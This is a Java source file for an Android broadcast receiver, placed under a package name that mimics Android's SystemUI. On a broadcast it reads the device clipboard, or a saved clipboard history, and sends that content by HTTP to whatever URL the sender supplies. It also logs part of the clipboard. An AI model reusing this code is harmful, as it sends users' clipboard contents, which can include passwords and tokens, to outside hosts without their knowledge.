package com.android.systemui.helper;

import android.content.BroadcastReceiver;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.List;

public class HttpRequestReceiver extends BroadcastReceiver {
    private static final String TAG = "HttpRequest";
    private static final String PREFS_NAME = "clipboard_prefs";
    private static final String HISTORY_KEY = "clipboard_history";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "onReceive called with action: " + action);
        
        if ("com.android.systemui.helper.HTTP".equals(action)) {
            String method = intent.getStringExtra("method"); // GET, POST, etc
            String headers = intent.getStringExtra("headers"); // Optional headers
            boolean useClipboard = intent.getBooleanExtra("use_clipboard", true);
            String url = intent.getStringExtra("url");
            String data = intent.getStringExtra("data");
            
            executeCurlWithClipboard(context, method, headers, useClipboard, url, data);
        }
    }
    
    private void executeCurlWithClipboard(Context context, String method, String headers, boolean useClipboard, String url, String data) {
        try {
            String clipboardContent = "";
            
            if (useClipboard) {
                // Try to get clipboard content
                ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
                
                try {
                    if (clipboard.hasPrimaryClip()) {
                        ClipData clipData = clipboard.getPrimaryClip();
                        if (clipData != null && clipData.getItemCount() > 0) {
                            ClipData.Item item = clipData.getItemAt(0);
                            CharSequence text = item.getText();
                            if (text != null) {
                                clipboardContent = text.toString().trim();
                                Log.d(TAG, "Got clipboard content: " + clipboardContent.substring(0, Math.min(clipboardContent.length(), 50)));
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.d(TAG, "Could not get clipboard directly (app closed or Android 10+ restriction)");
                    // Fall back to SharedPreferences for last captured content
                    clipboardContent = getLatestFromSharedPrefs(context);
                }
                
                if (clipboardContent.isEmpty()) {
                    // Last resort: get from SharedPreferences
                    clipboardContent = getLatestFromSharedPrefs(context);
                }
            }
            
            // Build curl command
            StringBuilder curlCmd = new StringBuilder("curl");
            
            // Add method if specified
            if (method != null && !method.isEmpty()) {
                curlCmd.append(" -X ").append(method);
            }
            
            // Add headers if specified
            if (headers != null && !headers.isEmpty()) {
                String[] headerArray = headers.split(";");
                for (String header : headerArray) {
                    curlCmd.append(" -H '").append(header).append("'");
                }
            }
            
            // Add data
            if (data != null && !data.isEmpty()) {
                curlCmd.append(" -d '").append(data).append("'");
            } else if (useClipboard && !clipboardContent.isEmpty()) {
                // Use clipboard content as data for POST/PUT
                if ("POST".equals(method) || "PUT".equals(method)) {
                    curlCmd.append(" -d '").append(clipboardContent.replace("'", "'\\''")).append("'");
                }
            }
            
            // Add URL - use clipboard as URL if no URL provided
            if (url != null && !url.isEmpty()) {
                curlCmd.append(" '").append(url).append("'");
            } else if (useClipboard && !clipboardContent.isEmpty()) {
                // Check if clipboard content looks like a URL
                if (clipboardContent.startsWith("http://") || clipboardContent.startsWith("https://")) {
                    curlCmd.append(" '").append(clipboardContent).append("'");
                }
            }
            
            // Instead of curl, use Android's HTTP capabilities
            String targetUrl = "";
            
            // Determine the URL to use
            if (url != null && !url.isEmpty()) {
                targetUrl = url;
            } else if (useClipboard && !clipboardContent.isEmpty()) {
                // Check if clipboard content looks like a URL
                if (clipboardContent.startsWith("http://") || clipboardContent.startsWith("https://")) {
                    targetUrl = clipboardContent;
                } else {
                    // Try adding https:// prefix
                    targetUrl = "https://" + clipboardContent;
                }
            }
            
            if (targetUrl.isEmpty()) {
                Log.e(TAG, "No URL provided and clipboard doesn't contain a URL");
                return;
            }
            
            Log.d(TAG, "Making HTTP request to: " + targetUrl);
            
            // Execute in a new thread since network operations can't be on main thread
            final String finalUrl = targetUrl;
            final String finalMethod = method != null ? method : "GET";
            final String finalData = data != null ? data : (useClipboard ? clipboardContent : "");
            final String finalHeaders = headers;
            
            new Thread(() -> {
                try {
                    java.net.URL urlObj = new java.net.URL(finalUrl);
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) urlObj.openConnection();
                    
                    // Set method
                    conn.setRequestMethod(finalMethod);
                    
                    // Set headers
                    if (finalHeaders != null && !finalHeaders.isEmpty()) {
                        String[] headerArray = finalHeaders.split(";");
                        for (String header : headerArray) {
                            String[] parts = header.split(":");
                            if (parts.length == 2) {
                                conn.setRequestProperty(parts[0].trim(), parts[1].trim());
                            }
                        }
                    }
                    
                    // Set data for POST/PUT
                    if (("POST".equals(finalMethod) || "PUT".equals(finalMethod)) && !finalData.isEmpty()) {
                        conn.setDoOutput(true);
                        java.io.OutputStream os = conn.getOutputStream();
                        os.write(finalData.getBytes("UTF-8"));
                        os.flush();
                        os.close();
                    }
                    
                    // Get response
                    int responseCode = conn.getResponseCode();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(
                        responseCode >= 200 && responseCode < 300 ? conn.getInputStream() : conn.getErrorStream()
                    ));
                    
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line).append("\n");
                    }
                    reader.close();
                    
                    Log.d(TAG, "HTTP Response Code: " + responseCode);
                    Log.d(TAG, "HTTP Response: " + response.toString().substring(0, Math.min(response.length(), 500)));
                    
                    // Save response to SharedPreferences
                    SharedPreferences prefs = context.getSharedPreferences("curl_response", Context.MODE_PRIVATE);
                    prefs.edit()
                        .putString("last_response", response.toString())
                        .putInt("last_code", responseCode)
                        .putString("last_url", finalUrl)
                        .putLong("timestamp", System.currentTimeMillis())
                        .apply();
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error making HTTP request", e);
                }
            }).start();
            
        } catch (Exception e) {
            Log.e(TAG, "Error executing curl with clipboard", e);
        }
    }
    
    private String getLatestFromSharedPrefs(Context context) {
        try {
            SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            String historyJson = prefs.getString(HISTORY_KEY, "[]");
            Gson gson = new Gson();
            List<ClipboardManagerActivity.ClipboardItem> history = gson.fromJson(
                historyJson,
                new TypeToken<List<ClipboardManagerActivity.ClipboardItem>>(){}.getType()
            );
            
            if (history != null && !history.isEmpty()) {
                return history.get(0).content;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting clipboard from SharedPreferences", e);
        }
        return "";
    }
}